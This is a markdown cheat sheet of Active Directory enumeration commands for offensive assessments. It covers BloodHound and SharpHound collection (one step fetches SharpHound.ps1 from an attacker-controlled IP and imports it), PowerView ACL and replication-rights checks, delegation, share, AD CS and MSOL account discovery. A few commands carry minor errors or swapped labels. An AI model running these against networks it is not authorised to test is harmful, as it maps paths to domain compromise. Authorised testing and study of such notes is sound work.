# Enumeration

- [Bloodhound](#bloodhound)
- [Bloodhound-Python](#bloodhound-python)
- [Powerview](#powerview)
- [Groups Membership](#groups-membership)
- [Service account](#service-account)
- [Group Information](#group-information)
- [User Information](#user-information)
- [SPN](#spn)
- [WDAC](#wdac)
- [Constrained Delegation](#constrained-delegation)
- [FSP](#fsp)
- [Shadow Security Principals](#shadow-security-principals)
- [DNS](#dns)
- [CredSSP](#credssp)
- [Shares](#shares)
- [AD CS](#ad-cs)
- [Azure](#azure)
- [Network Monitoring](#network-monitoring)
- [Tool list](#tool-list)

## Bloodhound 

Warning : Verify that the collector you're using match the Bloodhound version 

### Bloodhound-Python


```
bloodhound-python -c all -u "<username>" -p "<password>" -d <domain> -dc <DCip> -ns <dns>
```

### From Sliver

```
sharp-hound-4 -- '-c all'
``` 

### SharpHound.ps1



On domain session : 

```
    iwr -uri http://<yourip>/SharpHound.ps1 -outfile SharpHound.ps1
    Import-Module .\Sharphound.ps1
    Invoke-BloodHound -CollectionMethod All 
```

On your VM :

```
    sudo neo4j start
```

Log on : http://localhost:7474 

```
    MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r (to delete all previous neo4j db)
```

run bloodhound on terminal and log to neo4j db
Open download folder then drag and drop “corp audit_20231223102113_BloodHound.zip”


### SharpHound.ps1

## Powerview


ACLs associated with a specified object :

```
	Get-DomainObjectAcl -Identity <user> –ResolveGUIDs
	Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<strings>"}
	Find-InterestingDomainAcl -ResolveGUIDs -Domain <domain>
```

Get the ACLs associated with the specified LDAP path to be used for search :

```
    Get-DomainObjectAcl -Searchbase "LDAP://CN=DomainAdmins,CN=Users,DC=domain,DC=corp" -ResolveGUIDs -Verbose
```

Search for interesting ACEs (use without GUIDs for faster result) :

```
	Find-InterestingDomainAcl -ResolveGUIDs	Find-InterestingDomainAcl -ResolveGUIDs
```

Get the ACLs associated with the specified path :

```
    Get-PathAcl -Path "\\us-dc\sysvol"	
```

Find if user has replication right :

```
	Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}
```

## Groups Membership

### AD Module


 ```
    Get-ADGroup -Identity <group> -Properties Description
 ```

Any groups with SID>1000 :

```
    Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"'
```

### Service account

### AD Module


```
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
## Group Information


### AD Module

```
    Get-ADGroup -Filter * -Properties Member -Server <target> | ?{$_.Member -match '<groupSID>'}
```

## User Information

 
### AD Module

```
    Get-DomainUser -Domain <domain> | ?{$_.ObjectSid -eq '<SID>'}
```
## SPN

### AD Module


```
    Get-ADUser -Identity <username> -Properties ServicePrincipalName | select ServicePrincipalName
```

## WDAC


```
	powershell Get-CimInstance -ClassName  Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

Remotly using winrs

```
    winrs -r:<target> "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```
Remotly using Invoke-Command

```
    Invoke-Command -Session $session3 -ScriptBlock {Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"}
```

## Constrained Delegation

### AD Module


 ```
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```

### Powerview

```
    Get-NetUser -TrustedToAuth
```

## FSP

### AD Module


 ```
    Find-ForeignGroup -Verbose
 ```

### Powerview

```
    Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server <name>
```

## Shadow Security Principals

### AD Module


 ```
    Get-ADObject -SearchBase ("CN=Shadow PrincipalConfiguration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
 ```

### Powerview

```
    Get-DomainObject -LDAPFilter '(objectClass=shadowSecurityPrincipal)' -Properties samaccountname, distinguishedname
```

## DNS

### AD Module


 ```
    Get-DnsServerZone -ZoneName <target> | fl *
 ```

### Powerview

```
    Get-DomainDNSRecord -ZoneName "example.com"
```

## CredSSP

### AD Module


 ```
    Get-WSManCredSSP
 ```

### Powerview

```
    Get-DomainGPO | Where-Object { $_.DisplayName -like '*CredSSP*' }
```

## Shares

### Powerview

```
    Invoke-ShareFinder -CheckShareAccess
```

### Powershell

```
    Get-SmbShare -CimSession <servername>
```
### CMD

```
    net view \\<servername>
```

## AD CS

### Crackmapexec

```
    crackmapexec ldap <ip> -u '<username>' -p '<password>' -M adcs 
    crackmapexec ldap <ip> -u '<username>' -p '<password>' -M adcs -O SERVER=<CAServername>
```
### AD-Module

```
    Get-ADUser -Filter * -Property Certificate | Select-Object Name, Certificate
```

```
    Get-ADComputer -Filter * -Property Certificate | Select-Object Name, Certificate
```

## Azure

### MSOL_.

#### AD Module


 ```
    Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server <domain> -Properties * | select SamAccountName,Description | fl
 ```


## Network Monitoring

TCPDump :
 ```
    tcpdump -i <interface> -s 0 -w - -U | tee output.pcap | tcpdump -r -
 ```


## Tool list :

Bloodhound Python :

- https://github.com/dirkjanm/BloodHound.py
- https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce

Powerview :

- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Ad-Module :

- https://github.com/samratashok/ADModule


[Back to top](#enumeration)
